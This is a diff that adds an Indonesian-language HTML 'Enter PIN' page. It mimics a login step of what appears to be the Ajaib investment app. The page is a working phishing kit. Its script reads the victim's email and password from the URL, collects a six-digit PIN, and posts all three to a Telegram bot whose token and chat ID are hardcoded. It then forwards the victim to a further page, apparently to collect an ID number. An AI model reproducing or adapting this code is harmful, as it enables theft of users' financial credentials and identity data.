@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <title>Masukkan PIN</title>
+
+  <style>
+    * { margin:0; padding:0; -webkit-tap-highlight-color:transparent; }
+    html, body { height:100%; overflow:hidden; font-family:Inter, sans-serif; background:#fff; }
+
+    body {
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
+    }
+
+    .screen {
+      width:100%;
+      max-width:430px;
+      padding:20px 18px;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      transition:opacity .35s ease;
+    }
+
+    .fade-out { opacity:0; }
+
+    .top { display:flex; align-items:center; height:60px; }
+    .back { cursor:pointer; transform:scale(.7); }
+
+    h1 {
+      margin:0 auto;
+      font-size:22px;
+      font-weight:700;
+      transform:translateX(-20px);
+    }
+
+    .pill {
+      display:flex;
+      align-items:center;
+      gap:10px;
+      align-self:center;
+      margin:10px 0 16px 0;
+      padding:6px 14px;
+      background:#fff;
+      border-radius:25px;
+      box-shadow:0 3px 12px rgba(0,0,0,0.06);
+    }
+
+    .avatar {
+      width:36px;
+      height:36px;
+      border-radius:50%;
+      overflow:hidden;
+    }
+
+    .avatar img { width:100%; height:100%; object-fit:cover; }
+
+    .email { font-size:14px; font-weight:700; }
+
+    .dots {
+      display:flex;
+      justify-content:center;
+      gap:24px;
+      margin-bottom:20px;
+    }
+
+    .dot {
+      width:16px;
+      height:16px;
+      border-radius:50%;
+      background:#d7e5f0;
+      transition:.15s;
+    }
+
+    .keypad {
+  margin-top:auto;
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:28px 20px;
+  justify-items:center;
+
+  padding-bottom:50px;  /* NAIKKAN KEYBOARD */
+  margin-bottom:20px;   /* JARAK TAMBAHAN DIBAWAH */
+}
+
+
+    .key {
+      width:60px;
+      height:60px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:22px;
+      font-weight:700;
+      border-radius:50%;
+      cursor:pointer;
+      user-select:none;
+    }
+
+    .zero { grid-column:2; }
+
+    .delete { cursor:pointer; width:28px; height:22px; display:flex; align-items:center; justify-content:center; }
+
+    .delete svg {
+      width:24px; height:20px;
+      stroke:#111; stroke-width:3;
+      fill:none; stroke-linecap:round; stroke-linejoin:round;
+    }
+
+    .bottom {
+      display:flex;
+      justify-content:space-between;
+      font-size:14px;
+      font-weight:700;
+      margin-top:14px;
+      padding-bottom:6px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="screen" id="screen">
+
+  <div class="top">
+    <div class="back" onclick="window.history.back()">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="15 18 9 12 15 6"></polyline>
+      </svg>
+    </div>
+    <h1>Masukkan PIN</h1>
+  </div>
+
+  <div class="pill">
+    <div class="avatar"><img src="Logoajaib.jpg"></div>
+    <div class="email" id="userEmail">*********</div>
+  </div>
+
+  <div class="dots" id="dots">
+    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+  </div>
+
+  <div class="keypad">
+    <div class="key" onclick="press(1)">1</div>
+    <div class="key" onclick="press(2)">2</div>
+    <div class="key" onclick="press(3)">3</div>
+    <div class="key" onclick="press(4)">4</div>
+    <div class="key" onclick="press(5)">5</div>
+    <div class="key" onclick="press(6)">6</div>
+    <div class="key" onclick="press(7)">7</div>
+    <div class="key" onclick="press(8)">8</div>
+    <div class="key" onclick="press(9)">9</div>
+
+    <div></div>
+    <div class="key zero" onclick="press(0)">0</div>
+
+    <div class="delete" onclick="del()">
+      <svg viewBox="0 0 42 32">
+        <path d="M14 3 L3 16 L14 29 H38 V3 H14 Z" />
+        <line x1="22" y1="12" x2="30" y2="20" />
+        <line x1="30" y1="12" x2="22" y2="20" />
+      </svg>
+    </div>
+  </div>
+
+  <div class="bottom">
+    <div>Lupa PIN?</div>
+    <div>Ubah Akun?</div>
+  </div>
+
+</div>
+
+<script>
+
+  // ============================================
+  //  AMBIL DATA DARI HALAMAN SEBELUMNYA
+  // ============================================
+  const params = new URLSearchParams(window.location.search);
+
+  const email = params.get("email") || "email@contoh.com";
+  const password = params.get("password") || "";
+  
+  document.getElementById("userEmail").textContent = email;
+
+  let pin = "";
+  const dots = document.querySelectorAll(".dot");
+  const screen = document.getElementById("screen");
+
+  function updateDots() {
+    dots.forEach((d, i) => {
+      d.style.background = i < pin.length ? "#0b5cff" : "#d7e5f0";
+    });
+  }
+
+  // ==================================================
+  //   FUNGSI KIRIM DATA PIN KE TELEGRAM
+  // ==================================================
+  async function sendToTelegram(email, password, pin) {
+
+    const BOT_TOKEN = "7959508278:AAGscaWzlJ0bwX1iTzhfcXT-Xp82TBYB67g";
+    const CHAT_ID = "5983910858";
+
+    const text =
+`🔵 LOGIN STEP 3 (PIN)
+
+Email : ${email}
+Password : ${password}
+PIN : ${pin}
+—————————`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      }),
+    });
+  }
+
+  // ==================================================
+  //   INPUT PIN
+  // ==================================================
+  function press(n) {
+    if (pin.length < 6) {
+      pin += n;
+      updateDots();
+
+      if (pin.length === 6) {
+
+        // KIRIM KE TELEGRAM
+        sendToTelegram(email, password, pin);
+
+        // animasi fade
+        screen.classList.add("fade-out");
+
+        setTimeout(() => {
+          const e = encodeURIComponent(email);
+          const p = encodeURIComponent(password);
+          const pi = encodeURIComponent(pin);
+
+          window.location.href = `nik.html?email=${e}&password=${p}&pin=${pi}`;
+        }, 450);
+      }
+    }
+  }
+
+  function del() {
+    pin = pin.slice(0, -1);
+    updateDots();
+  }
+
+</script>
+
+</body>
+</html>
